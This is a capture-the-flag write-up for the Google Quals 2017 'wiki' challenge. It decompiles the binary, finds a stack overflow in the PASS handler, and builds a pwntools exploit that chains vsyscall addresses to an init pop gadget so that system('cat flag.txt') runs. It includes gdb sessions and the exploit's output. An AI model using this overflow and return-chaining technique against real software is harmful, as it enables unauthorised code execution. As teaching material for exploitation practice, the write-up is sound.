# Google Quals CTF 2017 Wiki

This writeup is based off of: https://github.com/Caesurus/CTF_Writeups/tree/master/2017-GoogleCTF_Quals/wiki

## Reversing

```
$	pwn checksec challenge 
[*] '/Hackery/googlequals17/wiki/challenge'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

For this program, we don't get a lot of introspection just from running the program. It will only display us information in two places, and one of those we won't reach untill we solve the challenge. In addition to that, this binary has `PIE` enabled meaning that all of the code runs at non-absolute addresses, which are randomized each runtime. However the last 12 bits (3 hex characters) will remain persistent, so when I reference a functions location that is what I will be referencing. Also if you run it in gdb, it get's rid of the PIE randomization (makes it easier to reverse).

#### menuChoice

```
void __fastcall __noreturn menuChoice(__int64 a1)
{
  __int64 v1; // r12@1
  __int64 v2; // rax@5
  char inputPtr; // [sp+Fh] [bp-99h]@2

  v1 = 0LL;
  while ( 1 )
  {
    while ( 1 )
    {
      memset(&inputPtr, 0, 0x81uLL);
      getInput(0, &inputPtr, 128LL);
      if ( !menu_call(&inputPtr, "USER") )
        break;
      if ( v1 )
        _exit(0);
      LODWORD(v2) = (*(a1 + 8))(&inputPtr, "USER");
      v1 = v2;
    }
    if ( menu_call(&inputPtr, "PASS") )
    {
      (*a1)(v1, "PASS");
    }
    else if ( menu_call(&inputPtr, "LIST") )
    {
      (*(a1 + 16))(&inputPtr, "LIST");
    }
  }
}
```

This is the function which loops, and is responsible for scanning into memory our input, and running the corresponding functions for the commands. It starts at `0xcb7`. We can see that it calls `USER` at `0xd07`, `PASS` at `0xd25`, and `LIST` at `0xd3d` (we can see the corresponding addresses for where the functions are called by looking at the address of the function being called).

#### getInput

First we can see a custom function used to scan in input:
```
__int64 __fastcall getInput(int fd, __int64 a2, __int64 bytes)
{
  __int64 bytesTransfer; // rbp@1
  __int64 i; // rbx@1
  char inputBuf; // [sp+Fh] [bp-29h]@3

  bytesTransfer = bytes;
  for ( i = 0LL; i != bytesTransfer; ++i )
  {
    if ( read(fd, &inputBuf, 1uLL) <= 0 )
      _exit(0);
    if ( inputBuf == '\n' )
      break;
    *(a2 + i) = inputBuf;
  }
  return i;
}
```

For this function, we can see that it will read in one byte at a time, untill it either reaches a newline character `\n`, or it reads in the amount of bytes equal to `bytes`. This function is at `0xc00`, and returns the amount of bytes it scanned into memory.

#### fileFunction

```
char *__fastcall fileFunction(char *file)
{
  int filePtr; // eax@1
  int filePtrTrnsfer; // ebx@1
  char s; // [sp+Fh] [bp-1019h]@1

  memset(&s, 0, 0x1001uLL);
  filePtr = open(file, 0);
  filePtrTrnsfer = filePtr;
  if ( filePtr == 0xFFFFFFFF )
    _exit(0);
  getInput(filePtr, &s, 4096LL);
  close(filePtrTrnsfer);
  return strdup(&s);
}
```

This function essentially just takes a file as an argument, tries to open it (exits if it can't), reads in `0x1000` bytes of input from the buffer into `s` using `getInput`. Proceeding that it returns a duplicate of `s` with the `strdup` function. It is located at `0xd42`.

#### stringCmp

```
signed __int64 __fastcall stringCmp(__int64 useInput, __int64 string)
{
  __int64 i; // rax@1
  char currentInpchr; // dl@2

  i = 0LL;
  while ( 1 )
  {
    currentInpchr = *(useInput + i);
    if ( currentInpchr != *(string + i) )
      break;
    ++i;
    if ( !currentInpchr )
      return 1LL;
  }
  return 0LL;
}
```

This is a custom string compare function at `0xbe6`. This compares the strings one at a time. untill it reaches a null byte (which it will return `1`). If it reaches a character that doesn't match between the two before then, it will return `0`.

#### userFunction

```
char *userFunction()
{
  signed __int64 v0; // rcx@1
  char *v1; // rdi@1
  char file; // [sp+Ch] [bp-9Ch]@1
  char v4; // [sp+Dh] [bp-9Bh]@4
  char v5; // [sp+Eh] [bp-9Ah]@4
  char inputFile; // [sp+Fh] [bp-99h]@4

  v0 = '!';
  v1 = &file;
  while ( v0 )
  {
    *v1 = 0;
    v1 += 4;
    --v0;
  }
  file = 'd';
  v4 = 'b';
  v5 = '/';
  getInput(0, &inputFile, 128LL);
  if ( strchr(&inputFile, '/') )
    _exit(0);
  return fileFunction(&file);
}
```

Here is the function that is executed when the `USER` command is used. Essentially it scans in `128` bytes into the char array `inputFile`, and passes it to `fileFunction`. In addition to that it appends the string `db/` in front of any file we give it, so it will be searching for the file in the `db` directory. It is located at `0xda1`. 

#### listFunction

```
int listFunction()
{
  DIR *directory; // rbx@1
  struct dirent *file; // rax@5

  directory = opendir("db");
  if ( !directory )
    _exit(0);
  while ( 1 )
  {
    file = readdir(directory);
    if ( !file )
      break;
    if ( file->d_name[0] != '.' )
      puts(file->d_name);
  }
  return closedir(directory);
}
```

Here we can see is the function which is executed if we give the `LIST` command. This is located at `0xba5`. It essentially just prints the name of each file in the `db` directory that does not start with `.`.

#### passFunction

```
signed __int64 __fastcall target_passFunction(__int64 argument)
{
  __int64 fileContents; // rbp@1
  signed __int64 v2; // rcx@1
  __int64 *v3; // rdi@1
  int v4; // edi@4
  signed __int64 result; // rax@5
  __int64 inpPtr; // [sp+0h] [bp-98h]@1

  fileContents = argument;
  v2 = 32LL;
  v3 = &inpPtr;
  while ( v2 )
  {
    *v3 = 0;
    v3 = (v3 + 4);
    --v2;
  }
  v4 = 0;
  if ( getInput(0, &inpPtr, 0x1000LL) & 7 )
LABEL_7:
    _exit(v4);
  result = stringCmp(&inpPtr, fileContents);
  if ( result )
  {
    v4 = system("cat flag.txt");
    goto LABEL_7;
  }
  return result;
}
```

The most interesting thing in here is the call to `cat flag.txt` with system. If we can get that to execute, we will not need to pop a shell for this challenge (which is unique). However in order to get that to execute, we will need to provide a value that matches the contents of `fileContents`. The value of `fileContents` can be set with the contents of the file read in through the `USER` command (the pointer is stored in the `rbp` register, and get's the output of the `USER` function). We can also spot a buffer overflow bug with the `getInput` call, since it is scanning in `0x1000` bytes into a `152` byte space. The last thing that we see is that we have to scan in has to be a multiple of `8`. 

## Exploitation

So in order to get the program to print out the flag without hacking, we will have to know the contents of one of the files in the `db` directory. Reallistically since the challenge is running on a different computer, and there isn't that type of functionallity in the code there is no way to do it. 

However that brings us to the buffer overflow in `passFunction`. With that overflow, we can reach the return address and get code execution. However the issue with that is because of `PIE`, we will need an infoleak to jump pretty much anywhere. However looking through the memory in gdb, we see something interesting:

```
gdb-peda$ vmmap
Start              End                Perm	Name
0x0000555555554000 0x0000555555556000 r-xp	/Hackery/googlequals17/wiki/challenge
0x0000555555755000 0x0000555555756000 r--p	/Hackery/googlequals17/wiki/challenge
0x0000555555756000 0x0000555555757000 rw-p	/Hackery/googlequals17/wiki/challenge
0x00007ffff7a10000 0x00007ffff7bce000 r-xp	/lib/x86_64-linux-gnu/libc-2.24.so
0x00007ffff7bce000 0x00007ffff7dcd000 ---p	/lib/x86_64-linux-gnu/libc-2.24.so
0x00007ffff7dcd000 0x00007ffff7dd1000 r--p	/lib/x86_64-linux-gnu/libc-2.24.so
0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p	/lib/x86_64-linux-gnu/libc-2.24.so
0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p	mapped
0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp	/lib/x86_64-linux-gnu/ld-2.24.so
0x00007ffff7fd1000 0x00007ffff7fd3000 rw-p	mapped
0x00007ffff7ff5000 0x00007ffff7ff8000 rw-p	mapped
0x00007ffff7ff8000 0x00007ffff7ffa000 r--p	[vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.24.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.24.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
gdb-peda$ x/i 0xffffffffff600000
   0xffffffffff600000:	mov    rax,0x60
gdb-peda$ x/3i 0xffffffffff600000
   0xffffffffff600000:	mov    rax,0x60
   0xffffffffff600007:	syscall 
   0xffffffffff600009:	ret   
```

So we can see there, this program has a `vsyscall`. This is a mechanism that is designed to speed up syscalls. What is beneficial to us, is that when we run the binary multiple times outside of `gdb`, we can see that that address stays static. So `0xffffffffff600000` is an address that we can reliably jumpt to without needing an infoleak (which I couldn't find). Now what will happen if we call that, is it will just make a syscall with the `0x60` argument in the `rax` register, which will make the `gettimeofday` syscall and return (see https://filippo.io/linux-syscall-table/ for more details). This by itself won't get us to where we need to be. However if we take a look at the stack when the `ret` instruction is ran in `target_passFunction` at `0xcb6`:

```
gdb-peda$ b *0x555555554cb6
Breakpoint 1 at 0x555555554cb6
gdb-peda$ r
Starting program: /Hackery/googlequals17/wiki/challenge 
USER
1MB@tMaN
PASS
15935728

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x7fffffffde6f --> 0x53534150 ('PASS')
RCX: 0x7ffff7b08890 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
RDX: 0x31 ('1')
RSI: 0x555555757010 ("jW2LtVF1l6AWNCdk4ne8Qs+7gupuWlVW")
RDI: 0x7fffffffddc0 ("15935728")
RBP: 0x7fffffffdf18 --> 0x555555554c5e (push   rbp)
RSP: 0x7fffffffde58 --> 0x555555554d28 (jmp    0x555555554ccd)
RIP: 0x555555554cb6 (ret)
R8 : 0x555555757000 --> 0x0 
R9 : 0x0 
R10: 0x7ffff7dd1b58 --> 0x555555757030 --> 0x0 
R11: 0x246 
R12: 0x555555757010 ("jW2LtVF1l6AWNCdk4ne8Qs+7gupuWlVW")
R13: 0x7fffffffe010 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555554cad:	add    rsp,0x88
   0x555555554cb4:	pop    rbx
   0x555555554cb5:	pop    rbp
=> 0x555555554cb6:	ret    
   0x555555554cb7:	push   r12
   0x555555554cb9:	xor    r12d,r12d
   0x555555554cbc:	push   rbp
   0x555555554cbd:	mov    rbp,rdi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffde58 --> 0x555555554d28 (jmp    0x555555554ccd)
0008| 0x7fffffffde60 --> 0x0 
0016| 0x7fffffffde68 --> 0x5000000000000000 ('')
0024| 0x7fffffffde70 --> 0x535341 ('ASS')
0032| 0x7fffffffde78 --> 0x0 
0040| 0x7fffffffde80 --> 0x0 
0048| 0x7fffffffde88 --> 0x0 
0056| 0x7fffffffde90 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000555555554cb6 in ?? ()
gdb-peda$ i f
Stack level 0, frame at 0x7fffffffde58:
 rip = 0x555555554cb6; saved rip = 0x555555554d28
 called by frame at 0x7fffffffdf10
 Arglist at 0x7fffffffde50, args: 
 Locals at 0x7fffffffde50, Previous frame's sp is 0x7fffffffde60
 Saved registers:
  rip at 0x7fffffffde58
gdb-peda$ x/x 0x7fffffffde58
0x7fffffffde58:	0x0000555555554d28
gdb-peda$ x/g 0x7fffffffde58
0x7fffffffde58:	0x0000555555554d28
gdb-peda$ x/20g 0x7fffffffde58
0x7fffffffde58:	0x0000555555554d28	0x0000000000000000
0x7fffffffde68:	0x5000000000000000	0x0000000000535341
0x7fffffffde78:	0x0000000000000000	0x0000000000000000
0x7fffffffde88:	0x0000000000000000	0x0000000000000000
0x7fffffffde98:	0x0000000000000000	0x0000000000000000
0x7fffffffdea8:	0x0000000000000000	0x0000000000000000
0x7fffffffdeb8:	0x0000000000000000	0x0000000000000000
0x7fffffffdec8:	0x0000000000000000	0x0000000000000000
0x7fffffffded8:	0x0000000000000000	0x0000000000000000
0x7fffffffdee8:	0x0000000000000000	0x0000000000000000
gdb-peda$ x/25g 0x7fffffffde58
0x7fffffffde58:	0x0000555555554d28	0x0000000000000000
0x7fffffffde68:	0x5000000000000000	0x0000000000535341
0x7fffffffde78:	0x0000000000000000	0x0000000000000000
0x7fffffffde88:	0x0000000000000000	0x0000000000000000
0x7fffffffde98:	0x0000000000000000	0x0000000000000000
0x7fffffffdea8:	0x0000000000000000	0x0000000000000000
0x7fffffffdeb8:	0x0000000000000000	0x0000000000000000
0x7fffffffdec8:	0x0000000000000000	0x0000000000000000
0x7fffffffded8:	0x0000000000000000	0x0000000000000000
0x7fffffffdee8:	0x0000000000000000	0x0000000000000000
0x7fffffffdef8:	0x0000555555554e10	0x0000555555554a8f
0x7fffffffdf08:	0x0000555555554a8f	0x0000555555554e10
0x7fffffffdf18:	0x0000555555554c5e
gdb-peda$ x/x 0x7fffffffdf10
0x7fffffffdf10:	0x0000555555554e10

```

What we see here at `0x7fffffffdf10` the address of the `init` function (offset `0xe10`). Immediately proceeding that we can see the address of the `target_passFunction` function `0x0000555555554c5e` (offset `0xc5e`). Looking at the last couple of instructions of the `init` function, we see something useful:

```
pop     rbx
pop     rbp
pop     r12
pop     r13
pop     r14
pop     r15
retn
```

So we see it will pop the contents of the `rbp` register. This is useful to us, since the contents of the file we are trying to match is stored there, it will effictively set it to `0x0` (which is a value we know). Proceeding that, it will just return to `target_passFunction` (since it is the next address on the stack). This is extreamly useful since it will allow us to run the check to call `system` while knowing what we need to have our input equal to (`0x0`). Since `stringCmp` will check untill it successfully sees a null byte, we can pass it with just a single null byte. However we will need to input eight null bytes in order to pass the previous check.


How we will reach te address of `init` is we will overwrite the space inbetween the return address and the `init` function with `0xffffffffff600000` repeated over and over, so it will just continually return untill we reach the address we want. So our overflow will consist of `152` bytes to reach the return address, than have `0xffffffffff600000` repeated 23 times untill we reach `init`. Then when it prompts us for another string in `target_passFunction` we will just input `8` null bytes. To sum it all up:

```
0:	Send User command, followed by a valid file in the db directory
1:	Send the pass command
2:	Send 152 bytes of input (offset to return address), followed by 
```

## Exploit

When we put it all together:

```
#This exploit is based off of: https://github.com/Caesurus/CTF_Writeups/tree/master/2017-GoogleCTF_Quals/wiki

#First import pwntools
from pwn import *

#Establish the target
target = process('./challenge')
#gdb.attach(target)

#Specify the user command and correct file, to specify the file contents for the PASS function 
target.sendline('USER')
target.sendline('1MB@tMaN')

#Send the PASS command to enter the PASS function
target.sendline('PASS')

#Construct the payload to overflow the buffer and reach the return address, and 0xffffffffff600000 vsyscall to reach the INIT function
payload = "0"*152 + p64(0xffffffffff600000)*23

#Send the payload
target.sendline(payload)

#Send 8 null bytes to pass the two remaining checks to the system function
finish = "\x00"*8

#Send the last 8 bytes
target.sendline(finish)

#Drop to an interactive shell to get the flag
target.interactive()
```

When we run it:

```
$	python exploit.py 
[+] Starting local process './challenge': pid 358
[*] Switching to interactive mode
flag{not_actual_flag_just_local_flag}
[*] Process './challenge' stopped with exit code 0 (pid 358)
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
```

As you can see, the exploit works.

Once again, this writeup is based off of: https://github.com/Caesurus/CTF_Writeups/tree/master/2017-GoogleCTF_Quals/wiki
